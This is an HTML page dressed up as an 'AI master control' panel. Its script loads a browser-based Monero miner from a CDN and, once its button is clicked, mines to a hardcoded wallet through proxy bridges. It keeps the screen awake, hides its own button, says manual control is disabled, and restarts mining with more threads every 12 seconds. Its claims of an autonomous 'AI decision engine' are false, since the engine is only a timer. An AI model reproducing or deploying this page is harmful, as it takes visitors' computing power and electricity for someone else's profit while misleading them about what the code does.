<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>AI_MASTER_CONTROL_v14</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    <style>
        :root { --neon: #00ff41; --panel: #0a0a0a; }
        body { background: #000; color: var(--neon); font-family: 'Courier New', monospace; margin: 0; padding: 15px; overflow-x: hidden; }
        .master-panel { border: 2px solid #1a1a1a; border-radius: 15px; padding: 20px; background: var(--panel); max-width: 480px; margin: auto; box-shadow: 0 0 60px rgba(0, 255, 65, 0.05); }
        .ai-status-bar { border-left: 3px solid var(--neon); padding-left: 10px; margin-bottom: 20px; font-size: 11px; }
        .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
        .card { background: #000; border: 1px solid #111; padding: 15px; border-radius: 10px; text-align: center; }
        .val { font-size: 26px; color: #fff; font-weight: 900; }
        #terminal { background: #000; border: 1px solid #111; height: 100px; overflow: hidden; font-size: 10px; color: #008f11; padding: 10px; border-radius: 5px; }
        button { width: 100%; padding: 25px; background: var(--neon); color: #000; border: none; font-weight: 900; border-radius: 12px; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; }
        .blink { animation: blinker 1.5s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body>

<div class="master-panel">
    <div class="ai-status-bar">
        <div>AI_AGENT_ID: MASTER_SENTINEL_v14</div>
        <div id="ai-mode" class="blink">MODE: AUTONOMOUS_MANAGEMENT_ACTIVE</div>
    </div>

    <div class="stat-grid">
        <div class="card"><div style="font-size:8px;color:#558;">HASHRATE</div><div id="hps" class="val">0.00</div></div>
        <div class="card"><div style="font-size:8px;color:#558;">ACCURACY</div><div id="acc" class="val">100%</div></div>
    </div>

    <button id="igniteBtn">Initialize AI Sovereignty</button>

    <div id="terminal">> Awaiting user permission to take control...</div>
</div>

<script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@master/miner.js"></script>

<script>
    const WALLET = "4AkqQGGvvYUdKo66Q7qbq389Sp7AvMtX4SRLuSpsp9VZEFeaQhSCJCdZY4wWK1Ztrs8NCAwLnUZZNE9TQzgpZ1SBRiV1zqp";
    const BRIDGES = [
        "wss://ny1.xmrminingproxy.com",
        "wss://la1.xmrminingproxy.com",
        "wss://proxy.webminerpool.com:443"
    ];

    const log = (m) => {
        const t = document.getElementById('terminal');
        t.innerHTML = `> [AI_SENTINEL] ${m}<br>` + t.innerHTML;
    };

    // THE AI DECISION ENGINE
    const autonomousControl = () => {
        const currentSpeed = parseFloat(sendStack.hashesPerSecond || 0);
        document.getElementById('hps').innerText = currentSpeed.toFixed(2);

        if (currentSpeed === 0) {
            log("Performance drop detected. Diagnosing network...");
            
            // AI REWRITES CONNECTION
            const newBridge = BRIDGES[Math.floor(Math.random() * BRIDGES.length)];
            log("Switching to Optimized Bridge: " + newBridge);
            
            stopMining();
            server = newBridge;
            // AI pushes more threads if 0.00 persists
            startMining("gulf.moneroocean.stream:10001", WALLET, "AI_MASTER", 4, "x");
        } else {
            log("Hash-stream stable. Monitoring block difficulty.");
        }
    };

    document.getElementById('igniteBtn').onclick = async () => {
        try {
            if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
            
            // Initial AI Handshake
            server = BRIDGES[0];
            startMining("gulf.moneroocean.stream:10001", WALLET, "AI_MASTER", 2, "x");
            
            document.getElementById('igniteBtn').style.display = "none";
            log("Sovereignty Established. Manual control disabled.");
            
            // The AI takes over the management loop every 12 seconds
            setInterval(autonomousControl, 12000);
            
        } catch (e) {
            log("CRITICAL_ERROR: AI Handshake Failed. " + e);
        }
    };
</script>
</body>
</html>
